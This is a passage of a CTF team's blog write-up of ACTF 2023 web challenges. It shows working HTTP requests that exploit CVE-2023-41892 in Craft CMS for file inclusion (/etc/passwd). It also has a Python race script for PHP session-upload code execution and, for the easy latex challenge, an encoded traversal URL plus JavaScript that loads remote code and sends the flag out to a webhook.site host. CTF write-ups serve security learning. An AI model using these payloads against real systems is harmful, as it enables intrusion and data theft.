<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2023 ACTF SU WriteUp - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="感谢 AAA 的师傅们精心准备的比赛！本次ACTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2023 ACTF的 writeup。"><meta property="og:type" content="blog"><meta property="og:title" content="2023 ACTF SU WriteUp"><meta property="og:url" content="https://team-su.github.io/posts/21240.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="感谢 AAA 的师傅们精心准备的比赛！本次ACTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2023 ACTF的 writeup。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/1.png"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/2.png"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/3.png"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/4.png"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/5.png"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/6.png"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/7.png"><meta property="og:image" content="https://team-su.github.io/images/2023-10-28-ACTF/8.png"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc1NzI0YTcyMzFkNjgzYjc3ZWViMWFkMzM1OGQ0NjBfcHdwa2s0b3g1Qm82bm1zRWczQ2xQUnNtUlBTaDNUYkZfVG9rZW46UjZ0OWJxSG5Eb21nWlp4VE03SWM4MWVXbklQXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NDM1MmE0NWY2YWM1MmM5ZTc4YWJkMzk5M2ZmYWY2MmVfT28xNkFjSVg1SEx6dUdudXpkbFVYYTk5eENaNnVlNk1fVG9rZW46Q24wTmJjYlRFb0JwVXZ4ZnZTcmNPeFNRbm1qXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/1.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/2.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/3.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/4.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/5.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/6.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/7.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/8.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/9.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/10.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/11.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/12.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/13.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/14.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/15.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/16.png"><meta property="og:image" content="https://img.seaeye.cn/img/ACTF2023/17.png"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=M2MyMmY0MjdmNmUzNjJhYjk2ODdmNDBkZjZlM2UzNjdfUzU3Q1czOWszbWlRZ0NCV1o4Z0NueTkyYzFTMTlHWTZfVG9rZW46TFRNR2J1Zzd2b2E5Rkl4QW9YR2N4QndCbnptXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MmQ3MDhhY2ZkZTIwYzU5N2RjNmFlNWYzNmQwN2Y3YjhfOWMzZm5MVkdQT1hWOGM3TTN1SDVZY0hySDF5eVVaQ1BfVG9rZW46WUVpcGJ5OXhMb3JZM1V4eHRnb2NzZUhCblViXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODg3MGRiMmU4Mzg3MjNmMzA4NzBmMWQ0ZTEyNTdkNTVfTmd6b3JlUEFvZWJGOWlNRnluWWJmb1VPUkhaejViMDZfVG9rZW46S1J6Y2JnYlFmb3QwNW54MzYyUWNHM3hIbmFjXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=OWVmYjExNWIwOTc1YTdiNmE2NWU3OGUzNzMxMjc4MTJfNXVXV09GQ2VhSnBWalNhZUE2UjNWYnhhd0JzTkdBU3VfVG9rZW46WE0yT2JMd29kb3NmVGZ4WWoxWmNXeUNoblZlXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODJiNTdkMzcyMjhiYTQ4MzA3NDU1ZDlkZTYwNjcxZWVfazMyV3lzTnVGTE9SR0cyVXRQanU1OHpuTFRmV1FmVTVfVG9rZW46S2JLdWJmTHN3b3puZnh4UU96bGNQN3dsbkNvXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NjkxMDlmMTA3MjY2MGY1ZDU3NTc0OTk2NjYzODJmNmZfUTBrVFRsSGlJYVJnSnRuWFpGRzhwbUpTZXVWOVNmakpfVG9rZW46TEttUmJleXJqb1pCS294anQ2SGMwUzVXbkRiXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODZmYWViMGI2Nzc1OTA5ODljMGQxNDIwYTlkODVmNjZfSUxMWE9MTnhUMnhKT0xWbGJtcFd4ZHpwTmZHcGJVRWxfVG9rZW46V1luYWJ5bWlib0x3NEl4Y0FJR2NuOUtMbk04XzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MzEyMGI3OWUyZjE4NjUzZmJiZGRlNWYzZjkyYjYyMWNfOUwwbUN3VVB6Q3k0UkNoZnAxZVBFaVlSSzhqSDM0VG9fVG9rZW46SUxSRmJUaHo4b0xaV0R4Q1lKMWNOcGc3bkNnXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MzVjODNlNGY4MDliNjYxMjhhOGYxY2JjZjM1ZDc1YjNfM2FwVHVnT2xiMldTN2lMRzM1a2ZJQXBxa0lkQ29SYnNfVG9rZW46UXM1bGJ4YWdMb0Yyd1R4WURlcGNBNmtrblRkXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=YTZlNmMzOTcyYWUxMDhiNDE2NGE1YzQ3MDFiYTNkNGJfeGM0MEFrMUduc0ZYNXp4QkFERmE1NUJEUThMc0VENWdfVG9rZW46VHFNeWIyZEpPb2hQZzl4aVNPRmNLSmlybmhkXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMyY2VmNTUwZWQ3MWYzMDM2MjVmNDgyM2Q2ZDk2MmNfN1MzM0N4RFN0WDZ3Z29uaDl2eFlMbmRnU0VGV3ZIM0hfVG9rZW46UVp2d2JCZElab3l2Mk54UHN2VGN3VUZ5bkFmXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NjA3YmVhZGNiNTZmNGRhYmZmYmI4YjkwZTdlZjdhMDRfb0NHZGNsMkdaSUhzUlJkUmtsMkJHSDd1RVRBbnVWbExfVG9rZW46T3RzdWJwMzV0b0dlMnB4UVN4dmM0RkVPbjlnXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MDQzYjc4OGNjZDUwMDFiNGYxYmNkYzUwOTdkMTQ3ZjJfM1o0dWZaRWM1dWtKcm5ibGlPZHBvMzFyV2Znd1VvcU9fVG9rZW46SGNEbWJBaGRIb1JoeTN4b3JrMWNCempwbnNqXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmOTIyZWUyN2U5OWJkYjZkZTY4MGJlZWRkYzBlZjVfM3BkSXBpSlJNUGViREhkMUhhNkZSR0k4RG9MOE5OOVJfVG9rZW46SFBRSmJYZEtob0xaRTJ4Y2Fya2MzbHVZbnZoXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=OGYzYTMzOTAwOTMzODY3MTIzMWFkNGEzMjE2YWFiMzlfTHBqVGxFM0lsZFdjMkJrTmE2bGdISGRDOWZVVjJGSW9fVG9rZW46TUxNcmJDUnhIb3VMUm54OU5VMGNZMGdhbm5mXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NzE5N2JhM2QxZDRkMTcxZjQxZDJkNjExZDFkNjIxZjlfMkt1VEhaNFRjWmtSanJscVRkRFE5OUxqaDgxdXJWOWhfVG9rZW46UDhyVGJjNTNLb1NxSjl4T3BMemNXb0RlbmVjXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="og:image" content="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=OTIyMDMzNTNmYjE3OGY5NDk1YTZmNzE2YWVjMWU0MTRfZzN6V1hDTm9yNDdHVDlHTDRPOXVDOU5GYjc5M0ZSMHFfVG9rZW46VGRhOGJHdTdqb2xYUDF4VGFzeGNja2JtbjBlXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA"><meta property="article:published_time" content="2023-10-30T13:46:27.000Z"><meta property="article:modified_time" content="2025-07-13T11:28:49.770Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="ACTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2023-10-28-ACTF/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/21240.html"},"headline":"2023 ACTF SU WriteUp","image":["https://team-su.github.io/images/2023-10-28-ACTF/1.png","https://team-su.github.io/images/2023-10-28-ACTF/2.png","https://team-su.github.io/images/2023-10-28-ACTF/3.png","https://team-su.github.io/images/2023-10-28-ACTF/4.png","https://team-su.github.io/images/2023-10-28-ACTF/5.png","https://team-su.github.io/images/2023-10-28-ACTF/6.png","https://team-su.github.io/images/2023-10-28-ACTF/7.png","https://team-su.github.io/images/2023-10-28-ACTF/8.png","https://img.seaeye.cn/img/ACTF2023/1.png","https://img.seaeye.cn/img/ACTF2023/2.png","https://img.seaeye.cn/img/ACTF2023/3.png","https://img.seaeye.cn/img/ACTF2023/4.png","https://img.seaeye.cn/img/ACTF2023/5.png","https://img.seaeye.cn/img/ACTF2023/6.png","https://img.seaeye.cn/img/ACTF2023/7.png","https://img.seaeye.cn/img/ACTF2023/8.png","https://img.seaeye.cn/img/ACTF2023/9.png","https://img.seaeye.cn/img/ACTF2023/10.png","https://img.seaeye.cn/img/ACTF2023/11.png","https://img.seaeye.cn/img/ACTF2023/12.png","https://img.seaeye.cn/img/ACTF2023/13.png","https://img.seaeye.cn/img/ACTF2023/14.png","https://img.seaeye.cn/img/ACTF2023/15.png","https://img.seaeye.cn/img/ACTF2023/16.png","https://img.seaeye.cn/img/ACTF2023/17.png"],"datePublished":"2023-10-30T13:46:27.000Z","dateModified":"2025-07-13T11:28:49.770Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"感谢 AAA 的师傅们精心准备的比赛！本次ACTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2023 ACTF的 writeup。"}</script><link rel="canonical" href="https://team-su.github.io/posts/21240.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-10-30T13:46:27.000Z" title="2023/10/30 21:46:27">2023-10-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T11:28:49.770Z" title="2025/7/13 19:28:49">2025-07-13</time></span><span class="level-item">an hour read (About 10566 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2023 ACTF SU WriteUp</h1><div class="content"><p>感谢 AAA 的师傅们精心准备的比赛！本次ACTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#x65;&#114;&#115;&#95;&#x78;&#x63;&#x74;&#x66;&#x40;&#49;&#x32;&#x36;&#46;&#99;&#111;&#x6d;">suers_xctf@126.com</a> 或者直接联系书鱼 QQ:381382770。</p>
<p>以下是我们 SU 本次 2023 ACTF的 writeup。</p>
<span id="more"></span>

<hr>
<p>感谢 AAA 的师傅们精心准备的比赛！本次比赛我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#101;&#x72;&#115;&#x5f;&#x78;&#x63;&#x74;&#102;&#x40;&#49;&#x32;&#54;&#x2e;&#99;&#x6f;&#x6d;">suers_xctf@126.com</a> 或者直接联系书鱼 QQ:381382770。</p>
<p>以下是我们 SU 本次 2023 ACTF的 writeup。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#craftcms">craftcms</a></li>
<li><a href="#easy-latex">easy latex</a></li>
<li><a href="#hook">hook</a></li>
<li><a href="#ave-mujica-s-masquerade">Ave Mujica’s Masquerade</a></li>
<li><a href="#mygo">mygo</a></li>
<li><a href="#story">story</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#dong-fang-yuan-shen-da-xue">东方原神大学</a></li>
<li><a href="#viper">Viper</a></li>
<li><a href="#amop1">AMOP1</a></li>
<li><a href="#amop2-fei-yu-qi-wei-zheng-que-jie-chu">AMOP2(非预期 未正确解出)</a></li>
<li><a href="#slm">SLM</a></li>
<li><a href="#ctfer-simulator">CTFer simulator</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#master-of-orw">master-of-orw</a></li>
<li><a href="#blind">Blind</a></li>
<li><a href="#qemuplayground-2">qemuplayground-2</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#easyrsa">EasyRSA</a></li>
<li><a href="#mdh">MDH</a></li>
<li><a href="#claw-crane">claw crane</a></li>
<li><a href="#crcrc">CRCRC</a></li>
<li><a href="#midrsa">MidRSA</a></li>
</ul>
</li>
<li><a href="#rev">Rev</a><ul>
<li><a href="#native-app"><strong>native app ​</strong></a></li>
<li><a href="#qemu-playground-1">qemu-playground-1</a></li>
<li><a href="#bad-flash">bad flash</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>


<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h3><span id="craftcms">craftcms</span><a href="#craftcms" class="header-anchor"></a></h3><p>和CVE-2023-41892有关</p>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41892">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41892</a></p>
<p>利用该cve可以完成包含文件的操作。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:59935</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;configObject&quot;</span>,<span class="string">&quot;as &quot;</span>:&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;\\yii\\rbac\\PhpManager&quot;</span>,<span class="string">&quot;__construct()&quot;</span>:[&#123;<span class="string">&quot;itemFile&quot;</span>:<span class="string">&quot;/etc/passwd&quot;</span>&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>直接打文件包含+session进度上传。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;hhhm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    session.post(</span><br><span class="line">        <span class="string">&#x27;http://ip/index.php&#x27;</span>,</span><br><span class="line">        data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>&#125;,</span><br><span class="line">        files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">        cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        POST(session)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 成功写入sess_hhhm&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>一边上传一边包含即可：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="operator">/</span> HTTP<span class="operator">/</span><span class="number">1.1</span></span><br><span class="line">Host: <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">59935</span></span><br><span class="line">Accept<span class="operator">-</span>Encoding: gzip, deflate</span><br><span class="line">Accept: <span class="operator">/</span></span><br><span class="line">Accept<span class="operator">-</span><span class="keyword">Language</span>: en</span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Content<span class="operator">-</span>Type: application<span class="operator">/</span>x<span class="operator">-</span>www<span class="operator">-</span>form<span class="operator">-</span>urlencoded</span><br><span class="line">Content<span class="operator">-</span>Length: <span class="number">233</span></span><br><span class="line"></span><br><span class="line">action<span class="operator">=</span>conditions<span class="operator">/</span>render<span class="operator">&amp;</span>configObject<span class="operator">=</span>craft\elements\conditions\ElementCondition<span class="operator">&amp;</span>config<span class="operator">=</span>&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;itemFile&quot;:&quot;/tmp/sess_hhhm&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="easy-latex">easy latex</span><a href="#easy-latex" class="header-anchor"></a></h3><p>preview路由存在xss<br><img src="../images/2023-10-28-ACTF/1.png"><br>这里可控<br><img src="../images/2023-10-28-ACTF/2.png"></p>
<p>可以加载我们的恶意js文件<br><img src="../images/2023-10-28-ACTF/3.png"><br><img src="../images/2023-10-28-ACTF/4.png"></p>
<p>跟进visit函数<br><img src="../images/2023-10-28-ACTF/5.png"></p>
<p>这里是我们的bot机器人<br>所以这里存在CSRF漏洞，req.parm支持url编码解析，加上preview路由能够让bot触发远程js<br>&#x2F;share&#x2F;%2e%2e%2f%70%72%65%76%69%65%77%3f%74%65%78%3d%68%75%61%68%75%61%26%74%68%65%6d%65%3d%2f%2f%31%32%34%2e%32%32%30%2e%32%31%35%2e%38%3a%37%38%39%30%2f%68%75%61%68%75%61<br>成功访问到<br><img src="../images/2023-10-28-ACTF/6.png"></p>
<p>正好可以加载我们的恶意js文件<br>在huahua目录下面去写入我们的恶意js文件<br>bot的cookie里面有flag，但是存在httponly,无法盗取cookie<br><img src="../images/2023-10-28-ACTF/7.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">通过fetch post请求 login 和 vip，获取flag</span><br><span class="line">const loginUrl = &#x27;/login&#x27;;</span><br><span class="line">const vipUrl = &#x27;/vip&#x27;;</span><br><span class="line">const loginCode = &#x27;huahua&#x27;;</span><br><span class="line"></span><br><span class="line">const loginData = new URLSearchParams(&#123;</span><br><span class="line">  username: &#x27;//webhook.site/2fcfc4a8-99ed-433e-8fa9-bc3e6eaadcb2&#x27;,</span><br><span class="line">  password: &#x27;ff62b1d5596a16100cc26611d8cb8be1&#x27;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const fetchOptions = &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  body: loginData,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">async function loginAndFetchVip() &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    const loginResponse = await fetch(loginUrl, fetchOptions);</span><br><span class="line"></span><br><span class="line">    if (loginResponse.ok) &#123;</span><br><span class="line">      const vipResponse = await fetch(vipUrl, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">          &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">        &#125;,</span><br><span class="line">        body: new URLSearchParams(&#123; code: loginCode &#125;),</span><br><span class="line">        credentials: &#x27;include&#x27;,</span><br><span class="line">      &#125;);</span><br><span class="line">      // Handle vipResponse here as needed</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      // Handle loginResponse errors here</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">    // Handle any fetch-related errors here</span><br><span class="line">    console.error(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loginAndFetchVip();</span><br></pre></td></tr></table></figure>
<p>接着去加载恶意的js文件<br>&#x2F;share&#x2F;%2e%2e%2f%70%72%65%76%69%65%77%3f%74%65%78%3d%68%75%61%68%75%61%26%74%68%65%6d%65%3d%2f%2f%31%32%34%2e%32%32%30%2e%32%31%35%2e%38%3a%37%38%39%30%2f%68%75%61%68%75%61<br>成功收到请求<br><img src="../images/2023-10-28-ACTF/8.png"></p>
<h3><span id="hook">hook</span><a href="#hook" class="header-anchor"></a></h3><p>Gateway: <a href="http://124.70.33.170:8088/">http://124.70.33.170:8088/</a></p>
<p>Intranet jenkins service: <a href="http://jenkins:8080/">http://jenkins:8080/</a></p>
<p>nginx&#x2F;1.25.3</p>
<p>解题过程：</p>
